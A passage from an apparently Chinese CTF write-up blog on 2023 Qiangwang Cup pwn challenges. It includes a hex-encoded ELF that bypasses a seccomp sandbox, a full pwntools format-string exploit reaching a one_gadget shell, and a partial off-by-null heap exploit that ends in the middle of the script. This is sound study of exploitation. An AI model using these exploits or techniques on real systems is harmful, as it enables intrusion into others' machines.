<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0014</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A == brk) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x40000001</span>  <span class="keyword">if</span> (A == x32_write) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x40000009</span>  <span class="keyword">if</span> (A == x32_mmap) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x4000000b</span>  <span class="keyword">if</span> (A == x32_munmap) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0c</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A != execve) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = filename &gt;&gt; <span class="number">32</span> <span class="meta"># execve(filename, argv, envp)</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0x00007fff</span>  <span class="keyword">if</span> (A != <span class="number">0x7fff</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = filename <span class="meta"># execve(filename, argv, envp)</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0xffffe29e</span>  <span class="keyword">if</span> (A == <span class="number">0xffffe29e</span>) <span class="keyword">goto</span> <span class="number">0021</span> <span class="keyword">else</span> <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0x40000003</span>  <span class="keyword">if</span> (A != ARCH_I386) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000006</span>  <span class="keyword">if</span> (A == lstat) <span class="keyword">goto</span> <span class="number">0021</span></span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A != fstat) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000018</span>  A = statbuf <span class="meta"># fstat(fd, statbuf)</span></span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0022</span></span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p>这些要求其实挺苛刻的,大多数想法因该是让一个段可写可执行,自修改code,变幻出syscall</p>
<p>不过禁止一个段同时拥有写和执行的权限便断了这条路</p>
<p>也有人提到利用elf映射机制将两块物理不相邻的段映射到一起,不过貌似比较难实现</p>
<h2 id="解1-1"><a href="#解1-1" class="headerlink" title="解1:"></a>解1:</h2><p>解1的思路,是利用栈必然是要可读可写的</p>
<p>因此,在内核加载elf的判断中只判断了stack段是否有执行权限,而不关注读和写权限</p>
<p>load_elf_binary的源代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Stack area protections */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_DEFAULT   0     <span class="comment">/* Whatever the arch defaults to */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_DISABLE_X 1     <span class="comment">/* Disable executable stacks */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXSTACK_ENABLE_X  2     <span class="comment">/* Enable executable stacks */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> executable_stack = EXSTACK_DEFAULT;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loc-&gt;elf_ex.e_phnum; i++, elf_ppnt++)</span><br><span class="line">    <span class="keyword">switch</span> (elf_ppnt-&gt;p_type) &#123;</span><br><span class="line">    <span class="keyword">case</span> PT_GNU_STACK:</span><br><span class="line">        <span class="keyword">if</span> (elf_ppnt-&gt;p_flags &amp; PF_X)</span><br><span class="line">            executable_stack = EXSTACK_ENABLE_X;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            executable_stack = EXSTACK_DISABLE_X;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>即就算将stack段的权限设置为—x,那么实际运行时权限也是rwx</p>
<p>以此就饶过了不能同时又写和执行权限这个检查</p>
<p><strong>ELF十六进制:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7F454C4602010100000000000000000002003E0001000000B00040000000000040000000000000001001000000000000000000004000380002004000030002000100000005000000000000000000000000004000000000000000400000000000F500000000000000F500000000000000000020000000000051E574640100000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000048C7C0A2DBC3004835ADDE0000504989E04831F64831D25248C7C0666C6167504889E74831C0B00241FFD04889C74889E6B230B00041FFD04831FFBF01000000B00141FFD00000002E7368737472746162002E74657874000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000010000000600000000000000B000400000000000B0000000000000004700000000000000000000000000000010000000000000000000000000000000010000000300000000000000000000000000000000000000F7000000000000004700000000000000000000000000000001000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<h2 id="解2-1"><a href="#解2-1" class="headerlink" title="解2:"></a>解2:</h2><p>解2的思路是利用程序启动时存在的vdso段</p>
<p>在vdso段中存在天然的syscall ret gadget</p>
<p>不过如何确定vdso的地址,</p>
<p>方法1是vdso的随机化范围很小,可以尝试爆破</p>
<p>方法2是在栈上能够找到指向vdso的指针,确定偏移就是</p>
<h2 id="seccomp-tools检测带参数elf"><a href="#seccomp-tools检测带参数elf" class="headerlink" title="seccomp-tools检测带参数elf"></a>seccomp-tools检测带参数elf</h2><p>在用seccomp-tools的过程中需要注意的是如果程序需要参数的话，可能就会分析失败。</p>
<p>例如本题</p>
<p>此时最佳办法是在prctl函数设置断点，然后dump第三个指针参数对应的内存。</p>
<p>之后再用disasm功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools disasm dumpfile</span><br></pre></td></tr></table></figure>
<h1 id="2023强网杯-ez-fmt"><a href="#2023强网杯-ez-fmt" class="headerlink" title="2023强网杯-ez_fmt"></a>2023强网杯-ez_fmt</h1><p><strong>标签:格式化字符串</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There is a gift for you %p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( w == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    w = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>格式化字符串漏洞,给了libc,会给栈地址</p>
<p>为了不让<code>w = 0</code>执行,选择修改printf的返回地址</p>
<p>返回到read处,因为单次长度有限,所以多次利用格式化字符串漏洞,</p>
<p>以此泄露libc并修改main的返回地址为one_gadget</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path)</span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>				:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>		:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> 						:p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content			:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content			:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content					:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content					:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> 						:p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content					:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr 				:log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(script):</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">p=process(elf_path)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.104.24.40&#x27;,1337)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%176c%10$hhn%16224c%11$hn%19$paa&#x27;</span></span><br><span class="line">payload+=p64(stack-<span class="number">8</span>)+p64(stack-<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">stack2=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">12</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;stack2&#x27;</span>,stack2)</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">leak(<span class="string">&#x27;startmain&#x27;</span>,libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">243</span>)</span><br><span class="line"></span><br><span class="line">one=libc.address+<span class="number">0xe3b01</span></span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">one=p64(one)</span><br><span class="line"><span class="comment">#irt()</span></span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%9$hhn%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(one[<span class="number">2</span>],one[<span class="number">1</span>]*<span class="number">0x100</span>+one[<span class="number">0</span>]-one[<span class="number">2</span>]).ljust(<span class="number">24</span>,<span class="string">&#x27;a&#x27;</span>).encode()</span><br><span class="line">payload+=p64(stack2+<span class="number">0x68</span>+<span class="number">2</span>)+p64(stack2+<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="2023强网杯-warmup23"><a href="#2023强网杯-warmup23" class="headerlink" title="2023强网杯-warmup23"></a>2023强网杯-warmup23</h1><p><strong>标签:off-by-null|tcache attack</strong></p>
<p>保护机制全部开启,存在沙盒,libc是2.35版本</p>
<p>静态分析可以看出是常规的菜单题</p>
<p>但是并没有edit</p>
<p>看主要的add函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">18</span> &amp;&amp; *((_QWORD *)&amp;unk_4040 + i); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">19</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;FUll!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    v2 = getnum();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)&amp;unk_4040 + i) = <span class="built_in">malloc</span>(v2);</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4040 + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Note: &quot;</span>);</span><br><span class="line">      *(_BYTE *)(*((_QWORD *)&amp;unk_4040 + i) + (<span class="type">int</span>)read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_4040 + i), v2)) = <span class="number">0</span>;<span class="comment">// off-by-null</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Success~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>malloc后即往其中输入数据,存在off-by-null,但也正是这个off-by-null使得无法有效的泄露</p>
<p>因此需要用到2.29及以上的off-by-null手法</p>
<p>见<a target="_blank" rel="noopener" href="https://tttang.com/archive/1614/">glibc2.29+的off by null利用 - 跳跳糖</a></p>
<p>核心思想是利用部分写修改残余链信息以满足unlink条件,最终目标依然是搞出chunk overlap</p>
<p><u>并通过大chunk切割后remainer部分放入unsortedbin制造fd,bk泄露libc,heap则可以通过<strong>unlink后更新的bk指针</strong>泄露</u>,当然也可以释放掉刚才申请的chunk,并再往unsortedbin中释放一个chunk再次切割,使得产生的fd,bk包含heap从而泄露,不过这样更麻烦</p>
<p>overlap之后就可以利用其中的barrier去uaf打tcache attack从而任意写(依然无法任意读.不过用任意写stdout可以做到)</p>
<p>再之后做法就多样了可以</p>
<ol>
<li>任意写stdout,构造io利用链,使用puts等io函数触发io利用链</li>
<li>stdout泄露environ,打rop</li>
</ol>
<p>个人选择方案1,利用obstack链进行攻击,布置好结构后,首先用</p>
<p><code>#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code>gadget完成rdi与rdx的互相交换</p>
<p>之后去执行setcontext+61完成mprotect返回到shellcode处执行orw</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&quot;A&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./warmup&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;120.24.69.11&#x27;,12700)</span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span>) <span class="comment">#0 A = P-&gt;fd</span></span><br><span class="line">add(<span class="number">0x108</span>-<span class="number">0x20</span>) <span class="comment">#1 barrier</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&quot;B0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#2 B0 helper</span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">b&quot;C0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#3 C0 = P , P&amp;0xff = 0</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">b&#x27;4&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#4 barrier</span></span><br><span class="line">add(<span class="number">0x488</span>, <span class="string">b&quot;H&quot;</span>*<span class="number">0x100</span>) <span class="comment"># H0. helper for write bk-&gt;fd. vitcim chunk.</span></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 6 D = P-&gt;bk</span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># 7 barrier</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment"># A</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># C0</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># D</span></span><br><span class="line"><span class="comment"># unsortedbin: D-C0-A   C0-&gt;FD=A</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span></span><br><span class="line">add(<span class="number">0x458</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x438</span> + p64(<span class="number">0x551</span>)[:-<span class="number">2</span>]) <span class="comment">#0 put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551</span></span><br><span class="line"><span 